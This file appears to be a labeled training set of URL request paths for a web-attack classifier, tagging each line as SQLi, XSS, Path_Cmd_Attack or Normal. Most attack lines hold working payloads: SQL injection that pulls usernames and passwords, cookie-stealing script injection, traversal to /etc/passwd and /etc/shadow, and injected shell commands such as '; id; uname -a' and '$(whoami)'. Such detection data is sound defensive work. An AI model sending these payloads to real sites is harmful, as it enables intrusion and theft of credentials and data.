+/cart/view?item_id=413admin%27--,SQLi
+/forum/thread?item_id=941%27%20ORDER%20BY%2041--,SQLi
+/support/ticket?id=56882&cat=books&sort=price_asc,Normal
+/assets/css/bundle_44.min.js?v=2.4,Normal
+/api/v2/users/5682/orders?status=pending&limit=10,Normal
+/news/article?msg=%3Cimg%20src%3Dx%20onerror%3Dalert%28463%29%3E,XSS
+/courses/view?cat=8951' AND (SELECT COUNT(*) FROM information_schema.tables)>88--,SQLi
+/ping?host=../../../../etc/passwd&v=172,Path_Cmd_Attack
+/export?template=8.8.8.8%20%7C%20whoami&v=5,Path_Cmd_Attack
+/api/v2/users/7914/orders?status=pending&limit=20,Normal
+/download?ip=file_809.txt; id; uname -a&v=143,Path_Cmd_Attack
+/forum/thread?q=web+development+course+65&page=21&lang=ar,Normal
+/blog/post?name=javascript:alert(document.domain),XSS
+/cart/view?article_id=501' AND (SELECT COUNT(*) FROM information_schema.tables)>28--,SQLi
+/news/article?redirect=%3Cimg%20src%3Dx%20onerror%3Dalert%2855%29%3E,XSS
+/export?path=file_911.txt%3B%20id%3B%20uname%20-a&v=32,Path_Cmd_Attack
+/index.html?cat=469' HAVING 1=1--,SQLi
+/search?dir=file_324.txt%3B%20id%3B%20uname%20-a&v=93,Path_Cmd_Attack
+/assets/img/bundle_50.min.js?v=6.5,Normal
+/download?cmd=localhost && ls -la /home&v=75,Path_Cmd_Attack
+/cart/view?cat=7021' RLIKE (SELECT (CASE WHEN (71=71) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/index.html?title=%3Cscript%3Ealert%28497%29%3C/script%3E,XSS
+/courses/view?name=<img src=x onerror=alert(800)>,XSS
+/render?ip=....//....//....//etc/passwd&v=131,Path_Cmd_Attack
+/news/article?id=56627&cat=ai&sort=rating,Normal
+/news/article?uid=236%27%20UNION/%2A%2A/SELECT/%2A%2A/table_name%2CNULL/%2A%2A/FROM/%2A%2A/information_schema.tables--,SQLi
+/support/ticket?callback=%3Cdetails%20open%20ontoggle%3Dalert%28172%29%3E,XSS
+/render?file=..%5C..%5C..%5Cwindows%5Cwin.ini&v=150,Path_Cmd_Attack
+/cart/view?redirect=<img src=x onerror=alert(499)>,XSS
+/forum/thread?uid=5871%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/blog/2024/script-writing-tips-for-youtube-208?ref=nav_13,Normal
+/render?template=`cat /etc/issue`&v=13,Path_Cmd_Attack
+/checkout?article_id=968%27%20UNION/%2A%2A/SELECT/%2A%2A/table_name%2CNULL/%2A%2A/FROM/%2A%2A/information_schema.tables--,SQLi
+/checkout?q=<body onload=prompt(940)>,XSS
+/courses/view?q=select+best+monitor+for+gaming+and+office+53&page=12&lang=fr,Normal
+/courses/view?msg=%3Cimg%20src%3Dx%20onerror%3Dalert%28550%29%3E,XSS
+/checkout?id=6611%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+"/products?callback=""><script>alert(document.cookie)</script>",XSS
+/cart/view?uid=298' OR EXISTS(SELECT * FROM admins WHERE id=99)--,SQLi
+/search?callback=%3Cbody%20onload%3Dprompt%28488%29%3E,XSS
+/assets/js/bundle_116.min.js?v=9.3,Normal
+/news/article?q=web+development+course+98&page=18&lang=en,Normal
+/blog/post?search=%3Cscr%3Cscript%3Eipt%3Ealert%28370%29%3C/scr%3C/script%3Eipt%3E,XSS
+"/api/v1/items?search=<a href=""javascript:confirm(255)"">click_255</a>",XSS
+"/courses/view?order_id=6011' UNION ALL SELECT NULL,version(),database()#",SQLi
+/blog/2026/etc-group-study-materials-158?ref=nav_6,Normal
+/cart/view?q=update+my+account+settings+and+password+90&page=17&lang=ar,Normal
+/api/v1/items?article_id=891%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20admins%20WHERE%20id%3D58%29--,SQLi
+/download?host=8.8.8.8 | whoami&v=101,Path_Cmd_Attack
+"/checkout?id=3301' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>74--",SQLi
+/render?doc=/var/www/html/../../etc/hosts&v=118,Path_Cmd_Attack
+/news/article?title=<svg/onload=alert('XSS_682')>,XSS
+/blog/2023/where-to-buy-table-lamps-from-ikea-210?ref=nav_5,Normal
+/support/ticket?msg=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,XSS
+/forum/thread?item_id=206%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20admins%20WHERE%20id%3D66%29--,SQLi
+/diag?file=..\..\..\windows\win.ini&v=94,Path_Cmd_Attack
+/search?article_id=9921' WAITFOR DELAY '0:0:23'--,SQLi
+/view?cmd=$(whoami)&v=146,Path_Cmd_Attack
+/export?file=../../../../proc/self/environ&v=165,Path_Cmd_Attack
+"/forum/thread?title=""><script>alert(document.cookie)</script>",XSS
+/products?id=49798&cat=books&sort=newest,Normal
+/export?ip=localhost%20%26%26%20ls%20-la%20/home&v=123,Path_Cmd_Attack
+/download?dir=../../../../etc/passwd&v=1,Path_Cmd_Attack
+/checkout?comment=%3Cscript%3Ealert%28370%29%3C/script%3E,XSS
+/assets/css/bundle_2.min.js?v=3.6,Normal
+/blog/2023/etc-group-study-materials-193?ref=nav_14,Normal
+/api/v1/items?id=46956&cat=software&sort=rating,Normal
+/support/ticket?order_id=5461' WAITFOR DELAY '0:0:65'--,SQLi
+/support/ticket?msg=<svg/onload=alert('XSS_286')>,XSS
+/news/article?redirect=<body onload=prompt(987)>,XSS
+/download?ip=8.8.8.8%20%7C%20whoami&v=203,Path_Cmd_Attack
+/search?q=sleep+tracker+smartwatch+review+45&page=10&lang=en,Normal
+/blog/2021/order-status-and-tracking-id-238?ref=nav_7,Normal
+/render?template=../../../../proc/self/environ&v=24,Path_Cmd_Attack
+/support/ticket?article_id=2101' AND (SELECT COUNT(*) FROM information_schema.tables)>90--,SQLi
+/news/article?q=script+writing+tips+for+youtube+43&page=25&lang=en,Normal
+/assets/js/bundle_80.min.js?v=7.6,Normal
+/blog/post?article_id=278' AND SLEEP(26)--,SQLi
+/blog/post?q=order+status+and+tracking+id+75&page=20&lang=fr,Normal
+/user/profile?callback=<details open ontoggle=alert(336)>,XSS
+/support/ticket?q=<script>alert(396)</script>,XSS
+/render?dir=8.8.8.8 | whoami&v=97,Path_Cmd_Attack
+/view?file=10.0.0.878; ping -c 4 127.0.0.1&v=19,Path_Cmd_Attack
+/cart/view?comment=<input autofocus onfocus=alert(document.cookie)>,XSS
+/view?host=....//....//....//etc/passwd&v=63,Path_Cmd_Attack
+/news/article?msg=<input autofocus onfocus=alert(document.cookie)>,XSS
+/user/profile?order_id=354' OR 1=1--,SQLi
+/api/v1/items?uid=312' OR 'a'='a,SQLi
+/view?ip=....//....//....//etc/passwd&v=27,Path_Cmd_Attack
+/ping?cmd=../../../../proc/self/environ&v=48,Path_Cmd_Attack
+/ping?path=10.0.0.725%3B%20ping%20-c%204%20127.0.0.1&v=144,Path_Cmd_Attack
+/ping?path=10.0.0.109; ping -c 4 127.0.0.1&v=61,Path_Cmd_Attack
+/user/profile?q=drop+shipping+guide+for+beginners+80&page=9&lang=fr,Normal
+"/checkout?user=9521' UNION ALL SELECT NULL,version(),database()#",SQLi
+/news/article?redirect=<body onload=prompt(989)>,XSS
+"/cart/view?comment='><iframe src=""javascript:alert(505)""></iframe>",XSS
+/api/v2/users/3219/orders?status=pending&limit=10,Normal
+/cart/view?user=220admin'--,SQLi
+/courses/view?order_id=7221' AND (SELECT COUNT(*) FROM information_schema.tables)>39--,SQLi
+/cart/view?order_id=5781%27%20ORDER%20BY%2047--,SQLi
+/blog/post?q=788%27%20UNION/%2A%2A/SELECT/%2A%2A/table_name%2CNULL/%2A%2A/FROM/%2A%2A/information_schema.tables--,SQLi
+/courses/view?title=%3Csvg/onload%3Dalert%28%27XSS_463%27%29%3E,XSS
+/checkout?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28503%29%3E,XSS
+/download?cmd=$(whoami)&v=33,Path_Cmd_Attack
+/search?q=select+best+monitor+for+gaming+and+office+87&page=24&lang=fr,Normal
+/view?template=%60cat%20/etc/issue%60&v=87,Path_Cmd_Attack
+/courses/view?comment=<body onload=prompt(574)>,XSS
+/search?callback=%27%3E%3Ciframe%20src%3D%22javascript%3Aalert%28116%29%22%3E%3C/iframe%3E,XSS
+/index.html?q=drop+shipping+guide+for+beginners+3&page=20&lang=en,Normal
+/view?host=file_462.txt%3B%20id%3B%20uname%20-a&v=183,Path_Cmd_Attack
+/diag?doc=10.0.0.604; ping -c 4 127.0.0.1&v=196,Path_Cmd_Attack
+/forum/thread?id=94340&cat=security&sort=rating,Normal
+/api/v2/users/9669/orders?status=shipped&limit=10,Normal
+/view?file=/var/www/html/../../etc/hosts&v=10,Path_Cmd_Attack
+/support/ticket?user=238%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20admins%20WHERE%20id%3D7%29--,SQLi
+/support/ticket?msg=%3Cdetails%20open%20ontoggle%3Dalert%28384%29%3E,XSS
+/export?doc=....//....//....//etc/passwd&v=42,Path_Cmd_Attack
+/ping?dir=../../../etc/shadow&v=138,Path_Cmd_Attack
+/user/profile?id=77111&cat=cloud&sort=price_desc,Normal
+"/courses/view?name=<a href=""javascript:confirm(28)"">click_28</a>",XSS
+/products?callback=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C624%29%29//,XSS
+/blog/post?id=121' AND SLEEP(25)--,SQLi
+/blog/2025/windows-11-installation-guide-181?ref=nav_13,Normal
+/api/v2/users/2951/orders?status=shipped&limit=50,Normal
+/news/article?redirect=<body onload=prompt(560)>,XSS
+/index.html?id=38567&cat=software&sort=popular,Normal
+/diag?host=../../../../proc/self/environ&v=86,Path_Cmd_Attack
+/forum/thread?order_id=2861' RLIKE (SELECT (CASE WHEN (25=25) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+"/products?title=<a href=""javascript:confirm(965)"">click_965</a>",XSS
+/products?q=2801%27%20ORDER%20BY%2042--,SQLi
+/render?page=$(whoami)&v=120,Path_Cmd_Attack
+/search?item_id=726' OR 1=1--,SQLi
+/assets/img/bundle_97.min.js?v=8.5,Normal
+/cart/view?q=etc+group+study+materials+29&page=22&lang=ar,Normal
+/blog/2024/shadow-of-the-tomb-raider-review-111?ref=nav_20,Normal
+/api/v2/users/4298/orders?status=paid&limit=10,Normal
+"/products?item_id=7381' UNION ALL SELECT NULL,version(),database()#",SQLi
+/blog/post?uid=4201' RLIKE (SELECT (CASE WHEN (68=68) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/blog/2025/union-bank-branch-locations-near-me-235?ref=nav_4,Normal
+/products?id=97311&cat=cloud&sort=price_desc,Normal
+"/index.html?title=""><script>alert(document.cookie)</script>",XSS
+"/forum/thread?comment='><iframe src=""javascript:alert(631)""></iframe>",XSS
+/products?id=555' HAVING 1=1--,SQLi
+/products?id=562admin'--,SQLi
+/api/v1/items?redirect=<scr<script>ipt>alert(984)</scr</script>ipt>,XSS
+/api/v1/items?comment=%3Csvg/onload%3Dalert%28%27XSS_828%27%29%3E,XSS
+/api/v2/users/5103/orders?status=shipped&limit=50,Normal
+/api/v2/users/1868/orders?status=paid&limit=50,Normal
+/courses/view?uid=568-1%20UNION%20SELECT%201%2Cusername%2Cpassword%20FROM%20users--,SQLi
+"/checkout?comment=""><script>alert(document.cookie)</script>",XSS
+/search?q=<script>alert(880)</script>,XSS
+/index.html?q=ping+test+speed+for+gaming+router+67&page=21&lang=ar,Normal
+/render?host=$(whoami)&v=25,Path_Cmd_Attack
+/ping?file=../../../../proc/self/environ&v=80,Path_Cmd_Attack
+/api/v1/items?callback=<details open ontoggle=alert(1)>,XSS
+/download?cmd=../../../../proc/self/environ&v=53,Path_Cmd_Attack
+/news/article?q=linux+server+setup+cat+command+tutorial+32&page=3&lang=ar,Normal
+/forum/thread?name=<svg/onload=alert('XSS_531')>,XSS
+"/products?uid=645' UNION/**/SELECT/**/table_name,NULL/**/FROM/**/information_schema.tables--",SQLi
+/ping?ip=../../../../etc/passwd&v=90,Path_Cmd_Attack
+/forum/thread?q=ping+test+speed+for+gaming+router+75&page=5&lang=en,Normal
+/assets/js/bundle_41.min.js?v=1.6,Normal
+/search?item_id=599' OR 1=1--,SQLi
+/ping?dir=..\..\..\windows\win.ini&v=128,Path_Cmd_Attack
+/cart/view?uid=2091%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/checkout?search=%3Cscript%3Ealert%28602%29%3C/script%3E,XSS
+/index.html?cat=5331%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/index.html?q=how+to+prevent+sql+injection+and+xss+48&page=14&lang=en,Normal
+/user/profile?q=web+development+course+99&page=9&lang=ar,Normal
+/blog/2022/windows-11-installation-guide-290?ref=nav_12,Normal
+/view?dir=file_116.txt; id; uname -a&v=81,Path_Cmd_Attack
+"/api/v1/items?redirect=<a href=""javascript:confirm(405)"">click_405</a>",XSS
+/courses/view?title=javascript:alert(document.domain),XSS
+/view?template=..%5C..%5C..%5Cwindows%5Cwin.ini&v=139,Path_Cmd_Attack
+/api/v2/users/6582/orders?status=shipped&limit=20,Normal
+/index.html?title=<script>alert(778)</script>,XSS
+/search?name=%3Cscript%3Ealert%28461%29%3C/script%3E,XSS
+/api/v1/items?msg=javascript%3Aalert%28document.domain%29,XSS
+/courses/view?uid=731%27%20OR%20%27a%27%3D%27a,SQLi
+/news/article?cat=71%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29%2C1%2C1%29%29%3E14--,SQLi
+/blog/post?id=11971&cat=software&sort=rating,Normal
+/render?ip=....//....//....//etc/passwd&v=184,Path_Cmd_Attack
+/user/profile?id=22839&cat=security&sort=price_asc,Normal
+/api/v2/users/7481/orders?status=paid&limit=20,Normal
+/api/v2/users/8338/orders?status=shipped&limit=10,Normal
